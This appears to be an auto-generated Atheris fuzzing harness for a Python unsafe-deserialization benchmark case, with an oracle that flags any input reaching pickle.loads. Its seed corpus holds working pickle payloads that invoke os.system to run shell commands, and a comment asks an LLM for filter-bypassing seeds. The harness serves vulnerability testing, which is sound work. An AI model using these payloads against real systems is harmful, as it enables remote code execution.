# AUTO-GENERATED ATHERIS HARNESS
# rule_id  : py/unsafe-deserialization
# function : BenchmarkTest00164_post
# file     : testcode/BenchmarkTest00164.py
# ================================================================
import atheris
import sys
import re
import os


from unittest.mock import patch, MagicMock



REPO_ROOT = "/home/tuonglnc/repo/VulnHunterX/repos/python/benchmark-python"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():

    from testcode.BenchmarkTest00164 import BenchmarkTest00164_post


# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [

    re.compile(".*", re.IGNORECASE),

]
_RAISE_MESSAGE  = "ORACULUM_VIOLATION: captured={captured}"
_TAINTED_PARAMS = [{"name": "request", "index": -1, "type": "flask_request"}]
# ========================================

# === ORACLE CONTEXT ===
# strategy         : recorded_call
# patch_target     : pickle.pickle.loads
# target_arg_index : 0
# target_arg_name  : None
# input_strategy   : flask_view
# signature        : def BenchmarkTest00164_post()
# condition        : oracle condition
# capture_what     : captured value
# skip_hint        : False
# ========================================


# === RECORDED_CALL SKELETON ===
# 1. INPUT GENERATION
#    - Generate inputs for tainted params using FuzzedDataProvider.
#    - For MULTIPLE params: split the buffer proportionally by param count.
#      For str/bytes params divide remaining bytes evenly; consume the last
#      str/bytes param with remaining bytes. Fixed-size types (int, float,
#      bool) consume their natural byte width first.
#      FORBIDDEN: Do NOT use ConsumeIntInRange() to index a strategy or branch.
#    - DO NOT embed a seed list inside TestOneInput or use ConsumeBool() to
#      select from a hardcoded list — seeds are managed externally in _SEED_CORPUS.
#
# 2. SKIP CONDITION
#    - Apply skip_hint early, return immediately if not met.
#
# 3. MOCK SETUP
#    - Patch `pickle.pickle.loads` using `with patch(...) as mock_get:`.
#    - Return a realistic MagicMock so the function continues past the patched call.
#
# 4. ORACLE CHECK
#    - After the call, iterate mock_get.call_args_list.
#    - For each call: check call.args[0] first,
#      fall back to call.kwargs.get("None").
#    - Match against every pattern in _COMPILED_PATTERNS.
#    - On match → raise RuntimeError(_RAISE_MESSAGE)
#
# 5. EXCEPTION HANDLING
#    - except RuntimeError: raise   → never swallow oracle signals
#    - except Exception:    return  → only around the target function call
# ==========================================



def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    
    # 1. INPUT GENERATION
    # Since _TAINTED_PARAMS has only one param "request" of type flask_request,
    # we generate a bytes payload to simulate the request body.
    request_data = fdp.ConsumeBytes(fdp.remaining_bytes())
    
    # Create a mock Flask request object
    class MockRequest:
        def __init__(self, data):
            self.data = data
            self.environ = {}
            self.method = 'POST'
    
    mock_request = MockRequest(request_data)
    
    # 2. SKIP CONDITION
    # skip_hint is False, so we don't apply any skip condition
    
    # 3. MOCK SETUP
    with patch('pickle.loads', return_value=MagicMock()) as mock_get:
        try:
            # Create an instance of the test class
            test_instance = BenchmarkTest00164_post()
            
            # Set the request attribute to our mock
            test_instance.request = mock_request
            
            # Call the target method
            test_instance.post()
        except Exception:
            # Only around the target function call
            return
    
    # 4. ORACLE CHECK
    for call in mock_get.call_args_list:
        # Get the first argument (index 0) which is the data being unpickled
        captured = None
        if call.args:
            captured = call.args[0]
        elif call.kwargs:
            captured = call.kwargs.get("None")
        
        if captured is not None:
            # Check against all patterns
            for pattern in _COMPILED_PATTERNS:
                if pattern.match(str(captured)):
                    raise RuntimeError(_RAISE_MESSAGE.format(captured=captured))
    
    # 5. EXCEPTION HANDLING
    # RuntimeError is not caught here, so it will propagate up


# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
# LLM: populate _SEED_CORPUS with entries designed to SURVIVE the filter,
# not just trigger it. Cover: mixed case, whitespace injection, unicode
# homoglyphs, double encoding, tag nesting, attribute abuse.
_SEED_CORPUS = [
    "cos\nsystem\n(S'echo vulnerable'\ntR.",
    "cos\nsystem\n(S\"bash -c 'ls > /tmp/ls_output'\"\ntR.",
    "cos\nsystem\n(S\"sh -c 'id > /tmp/id_output'\"\ntR.",
    "cos\nsystem\n(S\"python -c 'import os; os.system(\\\"id\\\")'\"\ntR.",
    "cos\nsystem\n(S\"perl -e 'system(\\\"id\\\")'\"\ntR.",
    "cos\nsystem\n(S\"ruby -e 'system(\\\"id\\\")'\"\ntR."
]


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    # This preserves coverage-guided mutation — fuzzer mutates content, not index.
    _CORPUS_DIR = "output/python/benchmark-python/fuzz_corpus/py_unsafe_deserialization_testcode_BenchmarkTest00164_py_47"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()